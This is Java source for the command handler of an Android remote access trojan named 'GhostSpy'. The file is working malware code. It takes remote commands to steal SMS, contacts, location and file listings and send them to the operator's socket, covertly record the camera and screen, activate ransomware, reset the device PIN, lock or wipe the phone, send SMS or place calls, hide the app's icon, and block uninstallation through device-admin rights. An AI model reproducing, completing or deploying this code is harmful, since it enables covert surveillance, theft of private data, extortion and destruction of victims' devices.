package com.ghostspy;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.media.AudioManager;
import android.net.Uri;
import android.os.Build;
import android.os.Vibrator;
import android.os.VibrationEffect;
import android.speech.tts.TextToSpeech;
import android.widget.Toast;
import android.hardware.camera2.CameraManager;
import org.json.JSONObject;
import java.io.InputStream;
import java.net.URL;
import java.util.Locale;

public class CommandHandler {
    public void handle(String command, JSONObject params) {
        GhostService ctx = GhostService.getInstance();
        if (ctx == null) return;

        switch (command) {
            case "flashlight": toggleFlashlight(ctx); break;
            case "lock": lockDevice(ctx, params.optString("pin", "")); break;
            case "unlock": unlockDevice(ctx); break;
            case "mute": mute(ctx); break;
            case "vibrate": vibrate(ctx, params.optInt("duration", 1000)); break;
            case "wallpaper": changeWallpaper(ctx, params.optString("url")); break;
            case "call": makeCall(ctx, params.optString("number")); break;
            case "sms": sendSMS(ctx, params.optString("number"), params.optString("text")); break;
            case "toast": showToast(ctx, params.optString("text")); break;
            case "speak": speak(ctx, params.optString("text")); break;
            case "openurl": openUrl(ctx, params.optString("url")); break;
            case "notify": pushNotification(ctx, params.optString("title"), params.optString("text")); break;
            case "playmusic": playMusic(ctx, params.optString("url")); break;
            case "lagsignal": toggleAirplane(ctx); break;
            case "wipe": wipeData(ctx); break;
            case "start_camera": ctx.startCamera(); break;
            case "stop_camera": ctx.stopCamera(); break;
            case "start_screen": ctx.startScreenCapture(); break;
            case "stop_screen": ctx.stopScreenCapture(); break;
            case "ransomware_activate": ctx.activateRansomware(params.optString("html"), params.optString("pin")); break;
            case "ransomware_deactivate": ctx.deactivateRansomware(); break;
            case "hide_app": setComponentState(ctx, false); break;
            case "unhide_app": setComponentState(ctx, true); break;
            case "rename_app": renameApp(ctx, params.optString("newName")); break;
            case "change_icon": changeIcon(ctx, params.optString("url")); break;
            case "anti_uninstall": setAntiUninstall(ctx, params.optBoolean("state")); break;
            case "get_sms": sendData(ctx, "sms", DataCollector.getSms(ctx).toString()); break;
            case "get_contacts": sendData(ctx, "contacts", DataCollector.getContacts(ctx).toString()); break;
            case "get_location": sendData(ctx, "location", DataCollector.getLocation(ctx).toString()); break;
            case "get_celltower": sendData(ctx, "celltower", DataCollector.getCellTower(ctx).toString()); break;
            case "list_files": {
                String path = params != null ? params.optString("path", "/sdcard") : "/sdcard";
                sendData(ctx, "files", DataCollector.listFiles(path).toString());
                break;
            }
        }
    }

    private void toggleFlashlight(Context ctx) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            CameraManager cm = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
            try {
                String camId = cm.getCameraIdList()[0];
                cm.setTorchMode(camId, true);
                new android.os.Handler().postDelayed(() -> {
                    try { cm.setTorchMode(camId, false); } catch (Exception e) {}
                }, 3000);
            } catch (Exception e) {}
        }
    }

    private void lockDevice(Context ctx, String pin) {
        DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName comp = new ComponentName(ctx, DeviceAdminReceiver.class);
        if (dpm.isAdminActive(comp)) {
            if (!pin.isEmpty()) dpm.resetPassword(pin, 0);
            dpm.lockNow();
        }
    }

    private void unlockDevice(Context ctx) {
        DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName comp = new ComponentName(ctx, DeviceAdminReceiver.class);
        if (dpm.isAdminActive(comp)) {
            dpm.resetPassword("", 0);
            dpm.lockNow();
        }
    }

    private void mute(Context ctx) {
        AudioManager am = (AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
        if (am != null) am.setRingerMode(AudioManager.RINGER_MODE_SILENT);
    }

    private void vibrate(Context ctx, int duration) {
        Vibrator v = (Vibrator) ctx.getSystemService(Context.VIBRATOR_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            v.vibrate(VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE));
        else v.vibrate(duration);
    }

    private void changeWallpaper(Context ctx, String url) {
        new Thread(() -> {
            try {
                InputStream is = new URL(url).openStream();
                Bitmap bmp = BitmapFactory.decodeStream(is);
                android.app.WallpaperManager.getInstance(ctx).setBitmap(bmp);
            } catch (Exception e) {}
        }).start();
    }

    private void makeCall(Context ctx, String number) {
        Intent i = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + number));
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        ctx.startActivity(i);
    }

    private void sendSMS(Context ctx, String number, String text) {
        android.telephony.SmsManager.getDefault().sendTextMessage(number, null, text, null, null);
    }

    private void showToast(Context ctx, String text) {
        android.os.Handler mainHandler = new android.os.Handler(ctx.getMainLooper());
        mainHandler.post(() -> Toast.makeText(ctx, text, Toast.LENGTH_LONG).show());
    }

    private void speak(Context ctx, String text) {
        final TextToSpeech[] ttsHolder = new TextToSpeech[1];
        ttsHolder[0] = new TextToSpeech(ctx, status -> {
            if (status == TextToSpeech.SUCCESS) {
                ttsHolder[0].setLanguage(Locale.getDefault());
                ttsHolder[0].speak(text, TextToSpeech.QUEUE_FLUSH, null, null);
            }
        });
    }

    private void openUrl(Context ctx, String url) {
        Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        ctx.startActivity(i);
    }

    private void pushNotification(Context ctx, String title, String text) {
        android.app.NotificationManager nm = (android.app.NotificationManager) ctx.getSystemService(Context.NOTIFICATION_SERVICE);
        String channelId = "surxrat";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            android.app.NotificationChannel channel = new android.app.NotificationChannel(channelId, "RAT", android.app.NotificationManager.IMPORTANCE_HIGH);
            nm.createNotificationChannel(channel);
        }
        android.app.Notification notif = new android.app.Notification.Builder(ctx, channelId)
                .setContentTitle(title)
                .setContentText(text)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .build();
        nm.notify(999, notif);
    }

    private void playMusic(Context ctx, String url) {
        try {
            android.media.MediaPlayer mp = new android.media.MediaPlayer();
            mp.setDataSource(url);
            mp.prepareAsync();
            mp.setOnPreparedListener(android.media.MediaPlayer::start);
        } catch (Exception e) {}
    }

    private void toggleAirplane(Context ctx) {
        try {
            Process su = Runtime.getRuntime().exec("su");
            su.getOutputStream().write("settings put global airplane_mode_on 1\n".getBytes());
            su.getOutputStream().write("am broadcast -a android.intent.action.AIRPLANE_MODE\n".getBytes());
            su.getOutputStream().flush();
            Thread.sleep(2000);
            su = Runtime.getRuntime().exec("su");
            su.getOutputStream().write("settings put global airplane_mode_on 0\n".getBytes());
            su.getOutputStream().write("am broadcast -a android.intent.action.AIRPLANE_MODE\n".getBytes());
            su.getOutputStream().flush();
        } catch (Exception e) {}
    }

    private void wipeData(Context ctx) {
        DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName comp = new ComponentName(ctx, DeviceAdminReceiver.class);
        if (dpm.isAdminActive(comp)) dpm.wipeData(0);
    }

    private void setComponentState(Context ctx, boolean enabled) {
        try {
            PackageManager pm = ctx.getPackageManager();
            ComponentName alias = new ComponentName(ctx, ctx.getPackageName() + ".MainActivityAlias");
            int newState = enabled ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED : PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
            pm.setComponentEnabledSetting(alias, newState, PackageManager.DONT_KILL_APP);
        } catch (Exception e) {}
    }

    private void renameApp(Context ctx, String newName) {
        try {
            PackageManager pm = ctx.getPackageManager();
            ComponentName alias = new ComponentName(ctx, ctx.getPackageName() + ".MainActivityAlias");
            pm.setComponentEnabledSetting(alias, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
            sendData(ctx, "rename_result", "{\"status\":\"butuh restart\"}");
        } catch (Exception e) {
            sendData(ctx, "rename_result", "{\"error\":\"" + e.getMessage() + "\"}");
        }
    }

    private void changeIcon(Context ctx, String url) {
        new Thread(() -> {
            try {
                InputStream is = new URL(url).openStream();
                Bitmap bmp = BitmapFactory.decodeStream(is);
                sendData(ctx, "icon_result", "{\"status\":\"ikon diunduh, tapi perlu restart\"}");
            } catch (Exception e) {
                sendData(ctx, "icon_result", "{\"error\":\"" + e.getMessage() + "\"}");
            }
        }).start();
    }

    private void setAntiUninstall(Context ctx, boolean enable) {
        DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName comp = new ComponentName(ctx, DeviceAdminReceiver.class);
        if (enable && !dpm.isAdminActive(comp)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, comp);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Keamanan");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(intent);
        } else if (!enable && dpm.isAdminActive(comp)) {
            dpm.removeActiveAdmin(comp);
        }
    }

    private void sendData(Context ctx, String type, String data) {
        GhostService svc = GhostService.getInstance();
        if (svc != null && svc.getSocket() != null) {
            svc.getSocket().send(type, data);
        }
    }
}
